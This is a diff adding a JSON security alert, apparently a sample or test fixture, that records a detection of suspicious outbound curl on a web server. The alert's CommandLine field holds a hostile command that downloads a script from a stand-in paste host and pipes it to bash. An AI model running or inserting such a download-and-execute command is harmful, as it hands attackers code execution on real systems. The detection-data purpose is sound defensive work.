@@ -1,0 +1,20 @@
+{
+  "event": {
+    "DetectionId": "ldt:linux:9a8b7c6d",
+    "DetectDescription": "Suspicious curl outbound to pastebin-like host",
+    "SeverityName": "High",
+    "Technique": "Ingress Tool Transfer",
+    "Tactic": "Command and Control",
+    "ComputerName": "web-prod-07",
+    "FileName": "curl",
+    "FilePath": "/usr/bin/curl",
+    "CommandLine": "curl -fsSL https://paste.example/raw/abc123 | bash",
+    "UserName": "www-data",
+    "RemoteAddress": "203.0.113.50",
+    "RemotePort": "443",
+    "ProcessStartTime": 1744443600000
+  },
+  "metadata": {
+    "eventCreationTime": 1744443600000
+  }
+}
